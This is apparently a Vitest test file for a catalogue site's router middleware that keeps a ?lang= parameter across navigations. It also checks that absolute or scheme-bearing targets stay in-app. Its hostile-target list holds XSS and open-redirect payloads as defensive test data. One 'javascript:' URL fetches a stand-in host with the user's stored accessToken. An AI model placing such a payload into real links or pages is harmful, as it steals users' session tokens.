import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { afterEach, describe, expect, it } from "vitest";
import {
  createMemoryHistory,
  createRootRoute,
  createRoute,
  createRouter,
} from "@tanstack/react-router";
import {
  holdSiteLanguage,
  isSiteLanguageHeld,
  retainSiteLanguage,
  siteNavigateOptions,
} from "./catalogue-route-search";
import { repairRetainedLocaleHref } from "./catalogue-site-language";

/**
 * The catalogue routes' ?lang= middleware in a REAL TanStack router (the
 * installed version, memory history): what the address bar ends up showing
 * for each kind of navigation, on a site without languages and while a site
 * with languages is on screen.
 */

/** The app's route shapes: catalogue routes carry the middleware, /login and /dashboard do not. */
const makeRouter = (initial: string) => {
  const rootRoute = createRootRoute({});
  const catalogueHome = createRoute({
    getParentRoute: () => rootRoute,
    path: "/",
    search: { middlewares: [retainSiteLanguage] },
  });
  const cataloguePage = createRoute({
    getParentRoute: () => rootRoute,
    path: "$tagName/",
    search: { middlewares: [retainSiteLanguage] },
  });
  // Like the real course route: a validateSearch that knows nothing of `lang`.
  const coursePage = createRoute({
    getParentRoute: () => rootRoute,
    path: "$tagName/$courseId/",
    search: { middlewares: [retainSiteLanguage] },
    validateSearch: (search: Record<string, unknown>) => ({
      packageSessionId: (search.packageSessionId as string) || undefined,
    }),
  });
  const login = createRoute({ getParentRoute: () => rootRoute, path: "login" });
  const dashboard = createRoute({ getParentRoute: () => rootRoute, path: "dashboard" });
  const history = createMemoryHistory({ initialEntries: [initial] });
  const router = createRouter({
    routeTree: rootRoute.addChildren([catalogueHome, cataloguePage, coursePage, login, dashboard]),
    history,
  });
  return { router, history };
};

type TestRouter = ReturnType<typeof makeRouter>["router"];

const start = async (initial: string) => {
  const made = makeRouter(initial);
  await made.router.load();
  return made;
};

/** What the address bar shows (the raw history entry, not the router's re-encoded copy). */
const addressOf = (history: ReturnType<typeof createMemoryHistory>) => history.location.href;

/** Navigates the way useSiteNavigate does. */
const siteNavigate = (router: TestRouter, target: string) => {
  const nav = siteNavigateOptions(target, router.latestLocation.search);
  return "href" in nav ? router.navigate({ href: nav.href }) : router.navigate({ to: nav.to as never });
};

let releases: Array<() => void> = [];
const holdForTest = () => {
  const release = holdSiteLanguage();
  releases.push(release);
  return release;
};

afterEach(() => {
  releases.forEach((release) => release());
  releases = [];
});

describe("a site without languages", () => {
  it("navigates exactly as before, even with a stray ?lang= in the URL", async () => {
    const { router, history } = await start("/new/about?lang=hi");
    await router.navigate({ to: "/new/courses" as never });
    expect(addressOf(history)).toBe("/new/courses");
    await router.navigate({ to: "/" as never });
    expect(addressOf(history)).toBe("/");
  });

  it("keeps an authored query string byte for byte", async () => {
    const { router, history } = await start("/new/about?lang=hi");
    for (const target of ["/new/courses?stream=x", "/new/courses?v=1.0&cat=1e3", "/new/courses?stream=a&category=a,b"]) {
      await siteNavigate(router, target);
      expect(addressOf(history)).toBe(target);
    }
  });

  it("always navigates with `to`", () => {
    expect(siteNavigateOptions("/new/courses?stream=x", { lang: "hi" })).toEqual({ to: "/new/courses?stream=x" });
    expect(siteNavigateOptions("/new/about#team", { lang: "hi" })).toEqual({ to: "/new/about#team" });
  });
});

describe("while a site with languages is on screen", () => {
  it("keeps ?lang= on every catalogue route", async () => {
    holdForTest();
    const { router, history } = await start("/new/about?lang=hi");
    await router.navigate({ to: "/new/courses" as never });
    expect(addressOf(history)).toBe("/new/courses?lang=hi");
    await router.navigate({ to: "/new/c1" as never, search: { packageSessionId: "ps-1" } as never });
    expect(addressOf(history)).toBe("/new/c1?packageSessionId=ps-1&lang=hi");
    await router.navigate({ to: "/" as never });
    expect(addressOf(history)).toBe("/?lang=hi");
  });

  it("drops it on /login and /dashboard", async () => {
    holdForTest();
    const { router, history } = await start("/new/about?lang=hi");
    await router.navigate({ to: "/login" as never });
    expect(addressOf(history)).toBe("/login");
    await router.navigate({ to: "/new/about" as never, search: { lang: "hi" } as never });
    await router.navigate({ to: "/dashboard" as never });
    expect(addressOf(history)).toBe("/dashboard");
  });

  it("lets a navigation name its own language, or drop it", async () => {
    holdForTest();
    const { router, history } = await start("/new/about?lang=hi");
    await router.navigate({ to: "/new/courses" as never, search: { lang: "en" } as never });
    expect(addressOf(history)).toBe("/new/courses?lang=en");
    await router.navigate({ to: "/new/about" as never, search: { lang: undefined } as never });
    expect(addressOf(history)).toBe("/new/about");
  });

  it("carries nothing when the URL has no ?lang=", async () => {
    holdForTest();
    const { router, history } = await start("/new/about");
    await siteNavigate(router, "/new/courses?stream=x&v=1.0");
    expect(addressOf(history)).toBe("/new/courses?stream=x&v=1.0");
  });

  it("joins the carried ?lang= into an authored query string or #hash (useSiteNavigate)", async () => {
    holdForTest();
    const { router, history } = await start("/new/about?lang=hi");
    expect(siteNavigateOptions("/new/courses?stream=shiksha", router.latestLocation.search)).toEqual({
      href: "/new/courses?stream=shiksha",
    });
    await siteNavigate(router, "/new/courses?stream=shiksha");
    expect(addressOf(history)).toBe("/new/courses?stream=shiksha&lang=hi");
    expect((router.state.location.search as Record<string, unknown>).stream).toBe("shiksha");

    await siteNavigate(router, "/new/about#team");
    expect(addressOf(history)).toBe("/new/about?lang=hi#team");

    // A plain address still goes through `to`, and the middleware adds lang.
    expect(siteNavigateOptions("/new/about", router.latestLocation.search)).toEqual({ to: "/new/about" });
    await siteNavigate(router, "/new/courses");
    expect(addressOf(history)).toBe("/new/courses?lang=hi");
  });

  it("is why plain `to` with a query string needs the repair: the language follows a second ?", async () => {
    holdForTest();
    const { router, history } = await start("/new/about?lang=hi");
    await router.navigate({ to: "/new/courses?stream=shiksha" as never });
    expect(addressOf(history)).toBe("/new/courses?stream=shiksha?lang=hi");
    // The router's own copy has already swallowed lang into stream…
    expect(router.state.location.searchStr).toBe("?stream=shiksha%3Flang%3Dhi");
    // …so CatalogueLocaleProvider repairs the RAW address.
    expect(repairRetainedLocaleHref(addressOf(history))).toBe("/new/courses?stream=shiksha&lang=hi");
  });
});

/**
 * Header, footer, hero and media-showcase targets reach siteNavigate as
 * authored (by hand, by API or in an AI draft). The router loads an absolute
 * URL given as `href` as a new page (window.location), which would run a
 * "javascript:" target — so these always go by `to`, as before languages.
 */
describe("a target with a scheme or a host", () => {
  const ABSOLUTE = [
    "javascript:fetch(`//x.example/`+localStorage.getItem(`accessToken`))//?a",
    "JavaScript:alert(1)//?a",
    " javascript:alert(1)//?a",
    "java\tscript:alert(1)//?a",
    "\u0000javascript:alert(1)//#a",
    " javascript:alert(1)//?a",
    "data:text/html,<script>alert(1)</script>?a",
    "https://evil.example/?a",
    "mailto:someone@example.com?subject=hi",
    "//evil.example/?a",
    "/\\evil.example?a",
    "\\\\evil.example?a",
    "/\t/evil.example?a",
    " //evil.example?a",
  ];

  it("always goes by `to`, even while a language is carried", () => {
    holdForTest();
    for (const target of ABSOLUTE) {
      expect(siteNavigateOptions(target, { lang: "hi" }), JSON.stringify(target)).toEqual({ to: target });
    }
  });

  it("stays a path inside the app (no window.location load)", async () => {
    holdForTest();
    for (const target of ABSOLUTE) {
      const { router, history } = await start("/new/about?lang=hi");
      // With `href` the router would assign window.location — absent here, so
      // that would throw instead of resolving.
      await siteNavigate(router, target);
      expect(addressOf(history).startsWith("/"), JSON.stringify(target)).toBe(true);
    }
  });

  it("leaves site addresses with their own query string or #hash on `href`", () => {
    holdForTest();
    expect(siteNavigateOptions("/new/courses?stream=x", { lang: "hi" })).toEqual({ href: "/new/courses?stream=x" });
    expect(siteNavigateOptions("courses?stream=x", { lang: "hi" })).toEqual({ href: "courses?stream=x" });
    expect(siteNavigateOptions("/new/about#team", { lang: "hi" })).toEqual({ href: "/new/about#team" });
    // A colon after the first "/" or "?" is not a scheme.
    expect(siteNavigateOptions("/new/courses?at=10:30", { lang: "hi" })).toEqual({ href: "/new/courses?at=10:30" });
    expect(siteNavigateOptions("courses/a:b?x=1", { lang: "hi" })).toEqual({ href: "courses/a:b?x=1" });
  });
});

describe("holdSiteLanguage", () => {
  it("counts every holder, and a release is good for one call only", () => {
    expect(isSiteLanguageHeld()).toBe(false);
    const first = holdSiteLanguage();
    const second = holdSiteLanguage();
    first();
    first();
    expect(isSiteLanguageHeld()).toBe(true);
    second();
    expect(isSiteLanguageHeld()).toBe(false);
  });
});

describe("route wiring", () => {
  const source = (relative: string) => readFileSync(fileURLToPath(new URL(relative, import.meta.url)), "utf8");
  const MIDDLEWARE = "search: { middlewares: [retainSiteLanguage] }";

  it("puts the middleware on every catalogue route", () => {
    for (const file of ["../index.tsx", "../$courseId/index.tsx", "../$pageSlug.tsx", "../$pageSlug_.$postSlug.tsx", "../../index.tsx"]) {
      expect(source(file), file).toContain(MIDDLEWARE);
    }
  });

  it("never on the root, /login or /dashboard", () => {
    for (const file of ["../../__root.tsx", "../../login/index.tsx", "../../dashboard/index.tsx"]) {
      expect(source(file), file).not.toContain("retainSiteLanguage");
    }
  });
});
